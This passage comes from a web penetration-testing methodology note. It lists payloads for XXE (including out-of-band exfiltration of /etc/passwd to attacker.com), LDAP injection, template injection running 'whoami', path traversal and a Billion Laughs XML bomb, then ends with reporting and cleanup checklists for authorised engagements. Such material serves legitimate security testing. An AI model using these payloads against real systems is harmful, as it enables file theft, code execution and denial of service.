If application accepts XML:

#### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>
```

#### Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**evil.dtd**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### LDAP Injection

If application uses LDAP:

**Normal query**:
```
(&(username=admin)(password=pass))
```

**Injection**:
```
username=admin)(&)
username=*)(uid=*))(|(uid=*
```

### Template Injection (SSTI)

**Detection**:
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

If `49` appears in response â†' Template injection!

**Exploitation** (depends on template engine):
```python
# Jinja2 (Python)
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# FreeMarker (Java)
${"freemarker.template.utility.Execute"?new()("whoami")}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

### Path Traversal

**In file downloads**:
```
/download?file=report.pdf
/download?file=../../etc/passwd
/download?file=..%2f..%2f..%2fetc%2fpasswd
/download?file=....//....//....//etc/passwd
```

**In file includes**:
```
/page?lang=en
/page?lang=../../../../etc/passwd
```

### XML Bomb (Billion Laughs Attack)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

Causes exponential memory usage (DoS).

**Log**: [[WEB-03-Request-Tracker#Other Injection]]

---

## Testing Completion Checklist

### Documentation Complete
- [ ] All phases attempted and documented
- [ ] [[WEB-03-Request-Tracker]] fully populated
- [ ] [[WEB-04-Evidence-Collection]] has all screenshots
- [ ] High/Critical findings have PoC documented
- [ ] Business impact assessed for each finding
- [ ] Burp project saved

### Evidence Collected
- [ ] Screenshots organized and named
- [ ] Burp requests/responses exported
- [ ] PoC scripts/HTML pages saved
- [ ] Video demonstrations (if applicable)
- [ ] Tool output saved (SQLMap, XSStrike, etc.)

### Findings Ready for Report
- [ ] Findings prioritized (Critical/High/Medium/Low)
- [ ] Each finding has clear PoC
- [ ] OWASP Top 10 mapping complete
- [ ] Remediation recommendations drafted
- [ ] Risk ratings justified

### Client Communication
- [ ] Critical findings reported immediately (if found)
- [ ] Testing completion confirmed with client
- [ ] Credentials/access returned or destroyed
- [ ] Final debrief scheduled

---

## Post-Testing

### Cleanup
- [ ] Remove any uploaded malicious files
- [ ] Delete test accounts created
- [ ] Clear any injected data (XSS payloads in database)
- [ ] Verify no backdoors remain

### Reporting
Proceed to [[WEB-05-Reporting-Template]] to document findings.

---

## Tags
#technical-testing #methodology #web-testing #hands-on #checklist #owasp

---

## Related Documents
- [[WEB-00-Overview|Overview]]
- [[WEB-01-Admin-Checklist|Admin Checklist]]
- [[WEB-03-Request-Tracker|Request Tracker]]
- [[WEB-04-Evidence-Collection|Evidence Collection]]
- [[WEB-05-Reporting-Template|Reporting Template]]
- [[WEB-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
